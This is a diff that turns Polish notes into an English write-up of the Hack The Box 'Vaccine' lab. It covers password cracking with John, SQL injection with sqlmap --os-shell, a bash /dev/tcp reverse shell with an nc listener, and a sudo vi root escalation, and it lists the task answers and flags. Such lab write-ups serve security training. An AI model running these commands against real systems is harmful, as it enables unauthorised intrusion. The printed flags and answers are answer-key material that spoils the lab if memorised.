@@ -1,58 +1,302 @@
-nmap -sC -sV -p- TARGET.IP -> otwarte porty 21/ftp, 22/ssh, 80 http, logowanie anonymous na ftp dozwolone
-na serwerze ftp znajduje sie plik backup.zip ktory jest zabezpieczony haslem
-do zlamania hasla uzyjemy narzedzia john the ripper
-musimy zamienic plik backup.zip na hash modulem johna:
-zip2john backup.zip > backuphash
-nastepnie: john -wordlist=/usr/share/wordlists/rockyou.txt backuphash
-john --show backuphash: haslo 741852963.
-rozpakowujemy plik backup.zip i otrzymujemy dwa kolejne pliki tj: index.php i style.ccs
-open index.php -> znajdujemy user: admin, password: 2cb42f8734ea607eefed3b70af13bbd3
-w tym samym pliku widzimy rowniez ze haslo jest zaszyfrowane w md5
-do zlamania hasla uzylem crackstation.net ->qwerty789
-po zalogowaniu sie do panelu admina widzimy katalog/wyszukiwarke ktora moze byc podatna na sqlinjecton. sprawdzamy to za pomoca narzedzia sqlmap.
-uzywamy skladni: 
-sqlmap -u 'http://TARGET.IP/dashboard.php?search=test' --
-cookie="PHPSESSID=idsesji .
-PHPSESSID przechwytujemy w burpie
-widzimy ze strona jest podatna na sql injection. uzywamy flagi --os-shell.
-nasluchujemy za pomoca nc -lvnp 12345
-nastepnie payload: bash -c "bash -i >& /dev/tcp/IP/12345 0>&1"
-stabilny shell - > python3 -c 'import pty;pty.spawn("/bin/bash")'
-w folderze /var/lib/postgresql znajduje flage user.txt: ec9b13ca4d6229cd5cc1e09980965bf7
-w folderze /var/www/html znajduje sie plik dashboard.php w ktorym mozemy znalezc haslo dla uzytkownika postgresql : P@s5w0rd!
-Probujemy zalogowac sie na ssh ktore wczesniej odkrylismy -> sukces
-sprawdzamy 
-w folderze /var/lib/postgresql znajduje flage user.txt: jakie mamy uprawnienia -> sudo -l     (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
-komenda: vi -c ':!/bin/sh' /dev/null nie dziala , probujemy innej metody
-vi -c 
-:set shell=/bin/sh 
-:shell
-dostajemy roota!
-cd /root
-cat root.txt
-flaga: dd6e058e814260bc70e9bbdef2715849
+# Hack The Box - Vaccine
 
-Task 1:
-Besides SSH and HTTP, what other service is hosted on this box?
-FTP
-Task 2:
-This service can be configured to allow login with any password for specific username. What is that username?
-anonymous
-Task 3:
-What is the name of the file downloaded over this service?
-backup.zip
-Task 4:
-What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?
-zip2john
-Task 5:
-What is the password for the admin user on the website?
-qwerty789
-Task 6:
-What option can be passed to sqlmap to try to get command execution via the sql injection?
--os-shell
-What program can the postgres user run as root using sudo?
-vi
-user flag: 
-ec9b13ca4d6229cd5cc1e09980965bf7
-root flag:
-dd6e058e814260bc70e9bbdef2715849
+Difficulty: Very Easy
+OS: Linux  
+IP: TARGET.IP  
+
+---
+
+# 0. Task Answers
+
+Task 1: Besides SSH and HTTP, what other service is hosted on this box?  
+FTP  
+
+Task 2: What username allows login with any password?  
+anonymous  
+
+Task 3: What is the name of the downloaded file?  
+backup.zip  
+
+Task 4: What script is used to extract hash from zip for John?  
+zip2john  
+
+Task 5: What is the password for the admin user?  
+qwerty789  
+
+Task 6: What option in sqlmap allows command execution?  
+--os-shell  
+
+Task 7: What program can the postgres user run as root using sudo?  
+vi  
+
+User Flag:  
+ec9b13ca4d6229cd5cc1e09980965bf7  
+
+Root Flag:  
+dd6e058e814260bc70e9bbdef2715849  
+
+---
+
+# 1. Reconnaissance
+
+## Nmap scan
+
+Command:
+
+nmap -sC -sV -p- TARGET.IP  
+
+Result:
+
+PORT     STATE SERVICE  
+21/tcp   open  ftp  
+22/tcp   open  ssh  
+80/tcp   open  http  
+
+Notes:
+
+- FTP allows anonymous login  
+- Web application available  
+
+Moje notatki:
+
+nmap -sC -sV -p- TARGET.IP -> otwarte porty 21/ftp, 22/ssh, 80 http  
+logowanie anonymous na ftp dozwolone  
+
+---
+
+# 2. Enumeration
+
+## FTP enumeration
+
+Login:
+
+anonymous@TARGET.IP  
+
+Findings:
+
+- file: backup.zip  
+
+Moje notatki:
+
+na serwerze ftp znajduje sie plik backup.zip zabezpieczony haslem  
+
+---
+
+## Cracking ZIP password
+
+Commands:
+
+zip2john backup.zip > backuphash  
+john -wordlist=/usr/share/wordlists/rockyou.txt backuphash  
+john --show backuphash  
+
+Result:
+
+- password: 741852963  
+
+Moje notatki:
+
+zip2john -> hash  
+john -> haslo 741852963  
+
+---
+
+## File analysis
+
+Extract:
+
+unzip backup.zip  
+
+Files:
+
+- index.php  
+- style.css  
+
+Findings:
+
+- user: admin  
+- password (md5): 2cb42f8734ea607eefed3b70af13bbd3  
+
+Moje notatki:
+
+index.php -> user admin + hash md5  
+
+---
+
+## Password cracking
+
+Tool:
+
+crackstation.net  
+
+Result:
+
+- password: qwerty789  
+
+Moje notatki:
+
+md5 -> qwerty789  
+
+---
+
+## Web login
+
+Login:
+
+admin : qwerty789  
+
+Result:
+
+- access to admin panel  
+
+---
+
+# 3. Exploitation
+
+## SQL Injection
+
+Target:
+
+http://TARGET.IP/dashboard.php?search=test  
+
+Command:
+
+sqlmap -u "http://TARGET.IP/dashboard.php?search=test" --cookie="PHPSESSID=SESSION"  
+
+Findings:
+
+- vulnerable to SQL injection  
+
+Moje notatki:
+
+PHPSESSID przechwytujemy w burpie  
+
+---
+
+## RCE via sqlmap
+
+Command:
+
+sqlmap -u "http://TARGET.IP/dashboard.php?search=test" --cookie="PHPSESSID=SESSION" --os-shell  
+
+---
+
+## Reverse shell
+
+Listener:
+
+nc -lvnp 12345  
+
+Payload:
+
+bash -c "bash -i >& /dev/tcp/IP/12345 0>&1"  
+
+Stabilization:
+
+python3 -c 'import pty;pty.spawn("/bin/bash")'  
+
+---
+
+# 4. Privilege Escalation
+
+## User flag
+
+Path:
+
+/var/lib/postgresql/user.txt  
+
+Flag:
+
+ec9b13ca4d6229cd5cc1e09980965bf7  
+
+---
+
+## Credentials discovery
+
+File:
+
+/var/www/html/dashboard.php  
+
+Password found:
+
+P@s5w0rd!  
+
+---
+
+## SSH access
+
+Login:
+
+postgres:P@s5w0rd!  
+
+Result:
+
+- SSH access obtained  
+
+---
+
+## Sudo privileges
+
+Command:
+
+sudo -l  
+
+Result:
+
+(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf  
+
+---
+
+## Exploit
+
+Command:
+
+vi -c ':set shell=/bin/sh' -c ':shell' /etc/postgresql/11/main/pg_hba.conf  
+
+Result:
+
+- root shell obtained  
+
+---
+
+# 5. Flags
+
+User flag:
+
+ec9b13ca4d6229cd5cc1e09980965bf7  
+
+Root flag:
+
+dd6e058e814260bc70e9bbdef2715849  
+
+---
+
+# 6. Lessons Learned
+
+- FTP anonymous access can leak sensitive backups  
+- password-protected archives can be cracked with John  
+- weak hashing (MD5) is easily broken  
+- SQL injection can lead to full system compromise  
+- sqlmap can automate exploitation and provide shell access  
+- always check sudo permissions for privilege escalation  
+- vi can be abused to spawn root shell  
+
+---
+
+# Tools Used
+
+- nmap  
+- ftp  
+- john the ripper  
+- zip2john  
+- sqlmap  
+- netcat  
+- python3  
+
+---
+
+# References
+
+- https://github.com/sqlmapproject/sqlmap  
+- https://www.openwall.com/john/  
+- https://gtfobins.github.io  
